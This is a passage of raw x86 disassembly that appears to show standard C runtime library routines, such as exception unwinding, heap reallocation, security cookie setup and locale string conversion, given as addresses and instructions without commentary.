  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
